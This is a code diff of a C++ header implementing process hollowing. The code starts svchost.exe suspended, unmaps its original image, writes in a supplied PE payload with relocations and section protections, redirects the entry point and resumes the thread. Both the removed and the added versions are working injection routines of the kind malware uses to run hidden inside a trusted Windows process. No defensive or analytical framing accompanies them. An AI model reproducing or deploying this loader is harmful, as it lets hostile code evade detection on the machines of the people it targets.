@@ -1,196 +1,339 @@
 #pragma once
 
 #include <windows.h>
-#include "Internals.h"
-#include "PE.h"
 
 class ProcessHollowing
 {
 public:
 	static HANDLE CreateHollowedProcess(void* image)
 	{
-		LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
-		LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
+		STARTUPINFOA ProcessStartupInfo;
+		PROCESS_INFORMATION ProcessInfo;
+
+		ZeroMemory(
+			&ProcessInfo,
+			sizeof(ProcessInfo));
+
+		ZeroMemory(&ProcessStartupInfo,
+			sizeof(ProcessStartupInfo));
+
+		ProcessStartupInfo.cb = sizeof(ProcessStartupInfo);
 
 		char filepath[MAX_PATH];
 		GetWindowsDirectoryA(filepath, sizeof(filepath));
 		strcat(filepath, "\\SysWOW64\\svchost.exe");
 
-		CreateProcessA
-		(
+		if (!CreateProcessA(
 			filepath,
-			0,
-			0,
-			0,
-			0,
+			NULL,
+			NULL,
+			NULL,
+			FALSE,
 			CREATE_SUSPENDED,
-			0,
-			0,
-			pStartupInfo,
-			pProcessInfo
-		);
-
-		if (!pProcessInfo->hProcess)
-			return INVALID_HANDLE_VALUE;
-
-		PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
-
-		PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
-
-		PLOADED_IMAGE pSourceImage = GetLoadedImage(DWORD(image));
-
-		PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders(DWORD(image));
-
-		HMODULE hNTDLL = GetModuleHandleA("ntdll");
-
-		FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
-
-		_NtUnmapViewOfSection NtUnmapViewOfSection =
-			(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
-
-		DWORD dwResult = NtUnmapViewOfSection
-		(
-			pProcessInfo->hProcess,
-			pPEB->ImageBaseAddress
-		);
-
-		if (dwResult)
-			return INVALID_HANDLE_VALUE;
-
-		PVOID pRemoteImage = VirtualAllocEx
-		(
-			pProcessInfo->hProcess,
-			pPEB->ImageBaseAddress,
-			pSourceHeaders->OptionalHeader.SizeOfImage,
-			MEM_COMMIT | MEM_RESERVE,
-			PAGE_EXECUTE_READWRITE
-		);
-
-		if (!pRemoteImage)
-			return INVALID_HANDLE_VALUE;
-
-		DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
-			pSourceHeaders->OptionalHeader.ImageBase;
-
-		pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;
-
-		if (!WriteProcessMemory
-		(
-			pProcessInfo->hProcess,
-			pPEB->ImageBaseAddress,
-			image,
-			pSourceHeaders->OptionalHeader.SizeOfHeaders,
-			0
+			NULL,
+			NULL,
+			&ProcessStartupInfo,
+			&ProcessInfo
 		))
 		{
+			TerminateProcess(ProcessInfo.hProcess, 0);
+			return INVALID_HANDLE_VALUE;
+		};
+
+		PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)image;
+		PIMAGE_NT_HEADERS lpNtHeader = (PIMAGE_NT_HEADERS)((LONG_PTR)image + lpDosHeader->e_lfanew);
+
+		ULONG lpPreferableBase = lpNtHeader->OptionalHeader.ImageBase;
+
+		CONTEXT ThreadContext;
+
+		ZeroMemory(
+			&ThreadContext,
+			sizeof(CONTEXT));
+
+		ThreadContext.ContextFlags = CONTEXT_INTEGER;
+
+		if (!GetThreadContext(
+			ProcessInfo.hThread,
+			&ThreadContext
+		))
+		{
+			TerminateProcess(ProcessInfo.hProcess, 0);
 			return INVALID_HANDLE_VALUE;
 		}
 
-		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
+		LPVOID lpPebImageBase;
+		lpPebImageBase = (LPVOID)(ThreadContext.Ebx + 2 * sizeof(ULONG));
+
+		SIZE_T stReadBytes;
+		PVOID lpOriginalImageBase;
+
+		ULONG dwOriginalImageBase;
+		if (!ReadProcessMemory(
+			ProcessInfo.hProcess,
+			lpPebImageBase,
+			&dwOriginalImageBase,
+			sizeof(dwOriginalImageBase),
+			&stReadBytes
+		))
 		{
-			if (!pSourceImage->Sections[x].PointerToRawData)
-				continue;
+			TerminateProcess(ProcessInfo.hProcess, 0);
+			return INVALID_HANDLE_VALUE;
+		}
+		
+		lpOriginalImageBase = (PVOID)dwOriginalImageBase;
 
-			PVOID pSectionDestination =
-				(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
+		if (lpOriginalImageBase == (LPVOID)lpPreferableBase)
+		{
+			HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+			FARPROC NtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");
 
-			if (!WriteProcessMemory
-			(
-				pProcessInfo->hProcess,
-				pSectionDestination,
-				LPVOID((DWORD(image) + pSourceImage->Sections[x].PointerToRawData)),
-				pSourceImage->Sections[x].SizeOfRawData,
-				0
-			))
+			if ((*(NTSTATUS(*)(HANDLE, PVOID)) NtUnmapViewOfSection)(
+				ProcessInfo.hProcess,
+				lpOriginalImageBase
+				))
 			{
+				TerminateProcess(ProcessInfo.hProcess, 0);
 				return INVALID_HANDLE_VALUE;
 			}
 		}
 
-		if (dwDelta)
+		LPVOID lpAllocatedBase;
+		if (!(lpAllocatedBase = VirtualAllocEx(
+			ProcessInfo.hProcess,
+			(LPVOID)lpPreferableBase,
+			lpNtHeader->OptionalHeader.SizeOfImage,
+			(MEM_COMMIT | MEM_RESERVE),
+			PAGE_EXECUTE_READWRITE
+		)))
 		{
-			for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
+			if (GetLastError() == ERROR_INVALID_ADDRESS)
 			{
-				auto pSectionName = ".reloc";
-
-				if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
-					continue;
-
-				DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
-				DWORD dwOffset = 0;
-
-				IMAGE_DATA_DIRECTORY relocData =
-					pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-
-				while (dwOffset < relocData.Size)
+				if (!(lpAllocatedBase = VirtualAllocEx(
+					ProcessInfo.hProcess,
+					NULL,
+					lpNtHeader->OptionalHeader.SizeOfImage,
+					(MEM_COMMIT | MEM_RESERVE),
+					PAGE_EXECUTE_READWRITE
+				)))
 				{
-					PBASE_RELOCATION_BLOCK pBlockheader =
-						(PBASE_RELOCATION_BLOCK)(DWORD(image) + (dwRelocAddr + dwOffset));
-
-					dwOffset += sizeof(BASE_RELOCATION_BLOCK);
-
-					DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
-
-					PBASE_RELOCATION_ENTRY pBlocks =
-						(PBASE_RELOCATION_ENTRY)(DWORD(image) + (dwRelocAddr + dwOffset));
-
-					for (DWORD y = 0; y < dwEntryCount; y++)
-					{
-						dwOffset += sizeof(BASE_RELOCATION_ENTRY);
-
-						if (pBlocks[y].Type == 0)
-							continue;
-
-						DWORD dwFieldAddress =
-							pBlockheader->PageAddress + pBlocks[y].Offset;
-
-						DWORD dwBuffer = 0;
-						ReadProcessMemory
-						(
-							pProcessInfo->hProcess,
-							(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
-							&dwBuffer,
-							sizeof(DWORD),
-							0
-						);
-						
-						dwBuffer += dwDelta;
-
-						BOOL bSuccess = WriteProcessMemory
-						(
-							pProcessInfo->hProcess,
-							(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
-							&dwBuffer,
-							sizeof(DWORD),
-							0
-						);
-
-						if (!bSuccess)
-							continue;
-					}
+					TerminateProcess(ProcessInfo.hProcess, 0);
+					return INVALID_HANDLE_VALUE;
 				}
-
-				break;
+			}
+			else
+			{
+				TerminateProcess(ProcessInfo.hProcess, 0);
+				return INVALID_HANDLE_VALUE;
 			}
 		}
-		
-		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
-			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
 
-		LPCONTEXT pContext = new CONTEXT();
-		pContext->ContextFlags = CONTEXT_INTEGER;
+		if (lpOriginalImageBase != lpAllocatedBase)
+		{
+			SIZE_T stWrittenBytes;
+			if (!WriteProcessMemory(
+				ProcessInfo.hProcess,
+				lpPebImageBase,
+				&lpAllocatedBase,
+				sizeof(lpAllocatedBase),
+				&stWrittenBytes
+			))
+			{
+				TerminateProcess(ProcessInfo.hProcess, 0);
+				return INVALID_HANDLE_VALUE;
+			}
+		}
 
-		if (!GetThreadContext(pProcessInfo->hThread, pContext))
+		lpNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
+
+		if (lpAllocatedBase != (LPVOID)lpPreferableBase)
+		{
+			if (lpNtHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
+			{
+				TerminateProcess(ProcessInfo.hProcess, 0);
+				return INVALID_HANDLE_VALUE;
+			}
+			lpNtHeader->OptionalHeader.ImageBase = (ULONG)lpAllocatedBase;
+
+			DWORD lpRelocationTableBaseRva = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+
+			PIMAGE_SECTION_HEADER lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
+			DWORD dwRelocationTableBaseOffset = 0;
+			for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++)
+			{
+				if (lpRelocationTableBaseRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
+					lpRelocationTableBaseRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize)
+				{
+					dwRelocationTableBaseOffset = lpHeaderSection[dwSecIndex].PointerToRawData + lpRelocationTableBaseRva - lpHeaderSection[dwSecIndex].VirtualAddress;
+					break;
+				}
+			}
+
+			LPVOID lpRelocationTableBase = (LPVOID)((DWORD_PTR)image + dwRelocationTableBaseOffset);
+			DWORD dwRelocationTableSize = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+
+			for (DWORD dwMemIndex = 0; dwMemIndex < dwRelocationTableSize;)
+			{
+				IMAGE_BASE_RELOCATION* lpBaseRelocBlock = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)lpRelocationTableBase + dwMemIndex);
+				LPVOID lpBlocksEntery = (LPVOID)((DWORD_PTR)lpBaseRelocBlock + sizeof(lpBaseRelocBlock->SizeOfBlock) + sizeof(lpBaseRelocBlock->VirtualAddress));
+
+				DWORD dwNumberOfBlocks = (lpBaseRelocBlock->SizeOfBlock - sizeof(lpBaseRelocBlock->SizeOfBlock) - sizeof(lpBaseRelocBlock->VirtualAddress)) / sizeof(WORD);
+				WORD* lpBlocks = (WORD*)lpBlocksEntery;
+
+				for (DWORD dwBlockIndex = 0; dwBlockIndex < dwNumberOfBlocks; dwBlockIndex++)
+				{
+					WORD wBlockType = (lpBlocks[dwBlockIndex] & 0xf000) >> 0xC;
+					WORD wBlockOffset = lpBlocks[dwBlockIndex] & 0x0fff;
+
+					if ((wBlockType == IMAGE_REL_BASED_HIGHLOW) || (wBlockType == IMAGE_REL_BASED_DIR64))
+					{
+						DWORD dwAdrressToFixRva = lpBaseRelocBlock->VirtualAddress + (DWORD)wBlockOffset;
+
+						lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
+						DWORD dwAdrressToFixOffset = 0;
+						for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++)
+						{
+							if (dwAdrressToFixRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
+								dwAdrressToFixRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize)
+							{
+								dwAdrressToFixOffset = lpHeaderSection[dwSecIndex].PointerToRawData + dwAdrressToFixRva - lpHeaderSection[dwSecIndex].VirtualAddress;
+								break;
+							}
+						}
+
+						ULONG* lpAddressToFix = (ULONG*)((DWORD_PTR)image + dwAdrressToFixOffset);
+						*lpAddressToFix -= lpPreferableBase;
+						*lpAddressToFix += (ULONG)lpAllocatedBase;
+					}
+				}
+				
+				dwMemIndex += lpBaseRelocBlock->SizeOfBlock;
+			}
+		}
+
+		ThreadContext.Eax = (ULONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint;
+
+		if (!SetThreadContext(
+			ProcessInfo.hThread,
+			&ThreadContext
+		))
+		{
+			TerminateProcess(ProcessInfo.hProcess, 0);
 			return INVALID_HANDLE_VALUE;
+		}
 
-		pContext->Eax = dwEntrypoint;
-
-		if (!SetThreadContext(pProcessInfo->hThread, pContext))
+		SIZE_T stWrittenBytes;
+		if (!WriteProcessMemory(
+			ProcessInfo.hProcess,
+			lpAllocatedBase,
+			image,
+			lpNtHeader->OptionalHeader.SizeOfHeaders,
+			&stWrittenBytes
+		))
+		{
+			TerminateProcess(ProcessInfo.hProcess, 0);
 			return INVALID_HANDLE_VALUE;
+		}
 
-		if (!ResumeThread(pProcessInfo->hThread))
+		DWORD dwOldProtect;
+		if (!VirtualProtectEx(
+			ProcessInfo.hProcess,
+			lpAllocatedBase,
+			lpNtHeader->OptionalHeader.SizeOfHeaders,
+			PAGE_READONLY,
+			&dwOldProtect
+		))
+		{
+			TerminateProcess(ProcessInfo.hProcess, 0);
 			return INVALID_HANDLE_VALUE;
+		}
 
-		return pProcessInfo->hProcess;
+		IMAGE_SECTION_HEADER* lpSectionHeaderArray = (IMAGE_SECTION_HEADER*)((ULONG_PTR)image + lpDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
+
+		for (int i = 0; i < lpNtHeader->FileHeader.NumberOfSections; i++)
+		{
+			if (!WriteProcessMemory(
+				ProcessInfo.hProcess,
+				(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
+				(LPCVOID)((DWORD_PTR)image + lpSectionHeaderArray[i].PointerToRawData),
+				lpSectionHeaderArray[i].SizeOfRawData,
+				&stWrittenBytes
+			))
+			{
+				TerminateProcess(ProcessInfo.hProcess, 0);
+				return INVALID_HANDLE_VALUE;
+			}
+
+			DWORD dwSectionMappedSize = 0;
+			if (i == lpNtHeader->FileHeader.NumberOfSections - 1)
+			{
+				dwSectionMappedSize = lpNtHeader->OptionalHeader.SizeOfImage - lpSectionHeaderArray[i].VirtualAddress;
+			}
+			else
+			{
+				dwSectionMappedSize = lpSectionHeaderArray[i + 1].VirtualAddress - lpSectionHeaderArray[i].VirtualAddress;
+			}
+
+			DWORD dwSectionProtection = 0;
+			if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
+				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+			{
+				dwSectionProtection = PAGE_EXECUTE_READWRITE;
+			}
+			else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ))
+			{
+				dwSectionProtection = PAGE_EXECUTE_READ;
+			}
+			else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+			{
+				dwSectionProtection = PAGE_EXECUTE_WRITECOPY;
+			}
+			else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
+				(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+			{
+				dwSectionProtection = PAGE_READWRITE;
+			}
+			else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+			{
+				dwSectionProtection = PAGE_EXECUTE;
+			}
+			else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ)
+			{
+				dwSectionProtection = PAGE_READONLY;
+			}
+			else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)
+			{
+				dwSectionProtection = PAGE_WRITECOPY;
+			}
+			else
+			{
+				dwSectionProtection = PAGE_NOACCESS;
+			}
+
+			if (!VirtualProtectEx(
+				ProcessInfo.hProcess,
+				(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
+				dwSectionMappedSize,
+				dwSectionProtection,
+				&dwOldProtect
+			))
+			{
+				TerminateProcess(ProcessInfo.hProcess, 0);
+				return INVALID_HANDLE_VALUE;
+			}
+		}
+
+		if (ResumeThread(
+			ProcessInfo.hThread
+		) == -1)
+		{
+			TerminateProcess(ProcessInfo.hProcess, 0);
+			return INVALID_HANDLE_VALUE;
+		}
+
+		return ProcessInfo.hProcess;
 	}
 };
